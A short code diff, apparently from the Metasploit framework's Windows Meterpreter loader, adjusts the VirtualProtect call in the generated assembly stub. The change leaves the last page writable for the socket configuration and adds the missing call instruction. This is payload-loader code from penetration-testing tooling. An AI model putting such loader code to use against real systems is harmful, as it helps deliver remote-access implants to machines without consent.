@@ -48,9 +48,10 @@ module Payload::Windows::MeterpreterLoader
           push 0               ; tmp var for holding old protect bits 
           push esp             ; push address of the tmp var
           push 0x20            ; PAGE_EXECUTE_READ
-          push #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
+          push #{"0x%.8x" % (opts[:length] - opts[:rdi_offset] - 0x1000)} ; let the last 0x1000 be RW since we will write socket config into it
           push ebx             
           push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualProtect')}
+          call ebp               ; call VirtualProtect
 
           ; pop the tmp var. The params for VirtualProtect have been popped
           pop eax
